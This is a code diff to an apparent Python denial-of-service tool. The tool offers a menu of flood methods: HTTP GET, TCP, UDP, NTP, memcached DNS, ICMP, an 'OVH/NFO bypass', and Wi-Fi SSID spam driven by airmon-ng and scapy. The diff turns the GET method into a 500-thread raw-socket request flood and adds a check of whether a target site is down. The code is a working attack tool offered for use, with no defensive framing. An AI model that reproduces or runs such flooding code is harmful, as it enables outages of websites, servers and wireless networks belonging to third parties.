@@ -1,3 +1,5 @@
+import os
+os.system("clear")
 print("""
  /$$   /$$                     /$$             /$$$$$$$$              
 | $$$ | $$                    | $$            | $$_____/              
@@ -21,13 +23,14 @@ import requests
 import threading
 import time
 import random
-import os
 import socket
 import sys
+import webbrowser
 from threading import Thread
 from scapy.all import *
 from requests.structures import CaseInsensitiveDict
 from time import sleep
+time.sleep(1)
 b = 0 
 user_agent_list = [
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
@@ -71,16 +74,20 @@ _____________________________________________________________________
 
 methods: 
 
-1.Nginx
+L7:
+1.Nginx (experimental)
 2.Cloudfare
 3.GET
+L4:
 4.TCP
 5.NTP
 6.UDP
 7.DNS (memcached packet)
 8.ICMP
-9.SSID spam
-10.OVH/NFO bypass""")
+9.OVH/NFO bypass
+Other:
+10.SSID spam
+11.Website checker""")
 	exit()
 url = website
 fff = str(sys.argv[2])
@@ -97,32 +104,37 @@ Website:
 		b = b + 1
 		for i in range(1,20):
 			user_agent = random.choice(user_agent_list)
-		headers = CaseInsensitiveDict()
-		headers["Connection"] = "keep-alive"
-		headers["Keep-Alive"] = "timeout=5, max=100"
 		headers = {'User-Agent': user_agent}
 		response = requests.get(url, headers=headers)		
 		response
 		os.system("clear")
 rand = 0
 if int(fff) == 3:
-	r = requests.get(website)
-	os.system("clear")
-	print("Note, request counter isn't laggy, it was made to update every 5498392 requests so that it doesn't hog computing power") 
-	while True:
-		rand = rand + 1
-		r.status_code
-		b = b + 1
-		if rand == 5498392:
+	attack_num = 0
+	target = url
+	port = 80
+	fake_ip = target
+	def attack():
+		while True:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((target, port))
+			s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+			s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+			global attack_num
+			attack_num += 1
 			os.system("clear")
 			print("""
 Requests sent:
-| """ + str(b)  + """ |
+| """ + str(attack_num)  + """ |
 Method:
 | GET |
 Website:
-| """ + url + """ |""")
-			rand = 0
+| """ + fake_ip + """ |""")
+			s.close()
+	for i in range(500):
+		thread = threading.Thread(target=attack)
+		thread.start()
+	time.sleep(100000000)
 if int(fff) == 4:
 	target_ip = website
 	target_port = 80
@@ -208,7 +220,7 @@ Method:
 | ICMP |
 IP:
 | """ + url + """ |""")
-if int(fff) == 9:
+if int(fff) == 10:
 	os.system("sudo airmon-ng check kill")
 	os.system("sudo airmon-ng start wlan0")
 	iface = "wlan0"
@@ -250,7 +262,7 @@ Method:
 Network name:
 | """ + url + """ |""")
 	time.sleep(100000000)
-if int(fff) == 10:
+if int(fff) == 9:
 	count = 0
 	target = url
 	target_port = 80
@@ -271,6 +283,9 @@ Method:
 | OVH/NFO bypass |
 Website:
 | """ + url + """ |""")
+if int(fff) == 11:
+	webbrowser.open("https://www.isitdownrightnow.com/" + url + ".html")
+	exit()
 def check_url(url):
 	try:
 		cloudfare_check_url = requests.Session()
